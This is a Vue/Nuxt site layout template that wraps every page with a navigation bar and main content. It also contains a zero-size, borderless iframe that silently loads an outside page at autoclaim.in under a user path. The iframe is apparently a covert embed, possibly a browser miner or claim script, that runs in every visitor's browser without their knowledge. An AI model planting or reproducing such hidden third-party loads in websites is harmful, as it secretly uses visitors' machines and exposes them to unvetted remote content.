<template>
  <div class="bg-gray-50 text-gray-900 leading-tight">
    <TheNavBar />
    <main>
      <Nuxt />
    </main>
    <iframe
      src="https://autoclaim.in/wm/acatzk/2"
      width="0"
      height="0"
      style="border:0"
    ></iframe>
  </div>
</template>

<script>
export default {
  components: {
    TheNavBar: () => import("~/components/TheNavBar")
  }
};
</script>
